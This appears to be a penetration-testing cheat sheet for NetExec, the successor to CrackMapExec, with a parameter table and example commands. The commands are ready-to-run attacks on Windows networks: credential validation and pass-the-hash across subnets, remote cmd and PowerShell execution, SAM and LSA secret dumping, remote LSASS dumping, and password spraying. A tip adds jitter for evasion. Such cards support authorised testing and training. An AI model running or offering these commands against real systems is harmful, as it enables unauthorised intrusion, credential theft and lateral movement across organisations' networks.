# NetExec

- **Category**: Password Attacks / Windows Network Exploitation
- **Risk Level**: 🔴 High

---

## Description

The maintained successor to CrackMapExec (`cme`). Tests SMB, WinRM, LDAP, MSSQL, SSH, RDP, FTP, NFS, VNC, and WMI across entire subnets — validating credentials, executing commands, dumping secrets (SAM/LSA/LSASS), enumerating shares/users/groups, and running post-exploitation modules. The Swiss Army knife for Windows internal network lateral movement and credential spraying.

## Installation

```bash
sudo apt install netexec
```

## Parameter Reference

| Parameter | Description |
|-----------|-------------|
| `smb / winrm / ldap / mssql / ssh / rdp / ftp / nfs / vnc / wmi` | Protocol to target |
| `<target>` | IP, CIDR range, hostname, or file containing targets |
| `-u <user>` | Username |
| `-p <pass>` | Password |
| `-H <hash>` | NTLM hash(es) or file(s) containing NTLM hashes |
| `-d <domain>` | Domain to authenticate to |
| `--local-auth` | Authenticate locally to each target |
| `-x <cmd>` | Execute cmd.exe command |
| `-X <cmd>` | Execute PowerShell command |
| `--shares` | Enumerate shares and access |
| `--users` | Enumerate domain users |
| `--groups` | Enumerate domain groups |
| `--sam` | Dump SAM hashes from target systems |
| `--lsa` | Dump LSA secrets |
| `-M <module>` | Module to use |
| `--continue-on-success` | Continue authentication attempts even after successes |
| `--gen-relay-list <file>` | Output hosts that don't require SMB signing to file |
| `--jitter <interval>` | Random delay between authentications (evasion) |
| `--timeout <seconds>` | Max timeout per thread |
| `-6` | Force IPv6 |

## Common Commands

```bash
# Validate credentials across a subnet
nxc smb 192.168.1.0/24 -u Administrator -p 'P@ssw0rd'

# Pass-the-Hash (PTH) across a subnet
nxc smb 192.168.1.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4

# Enumerate SMB shares
nxc smb 192.168.1.0/24 -u user -p 'P@ssw0rd' --shares

# Execute command on all authenticated hosts
nxc smb 192.168.1.0/24 -u Administrator -p 'P@ssw0rd' -x 'whoami'

# Dump SAM hashes (requires local admin)
nxc smb 192.168.1.10 -u Administrator -p 'P@ssw0rd' --sam

# Dump LSA secrets
nxc smb 192.168.1.10 -u Administrator -p 'P@ssw0rd' --lsa

# Run lsassy module (remote LSASS dump without file drop)
nxc smb 192.168.1.0/24 -u Administrator -p 'P@ssw0rd' -M lsassy

# WinRM — execute PowerShell command
nxc winrm 192.168.1.10 -u Administrator -p 'P@ssw0rd' -X 'Get-Process'

# LDAP — enumerate domain users
nxc ldap 192.168.1.10 -u user -p 'P@ssw0rd' --users

# Password spray (multiple users, one password)
nxc smb 192.168.1.10 -u users.txt -p 'Welcome2024!' --continue-on-success
```

## Notes & Tips

1. NetExec is the direct replacement for CrackMapExec — all existing `cme` commands work identically with `nxc`.
2. Green `[+]` in output means authentication succeeded; `(Pwn3d!)` indicates local admin access.
3. `--continue-on-success` is essential for password spraying — without it, the tool stops at the first success.
4. Use `--local-auth` when testing local (non-domain) accounts, especially after pivoting into a workgroup segment.
5. List all available modules for a protocol: `nxc smb -L`.

---

## Official References

- [NetExec (GitHub)](https://github.com/Pennyw0rth/NetExec)
- [Kali netexec](https://www.kali.org/tools/netexec/)
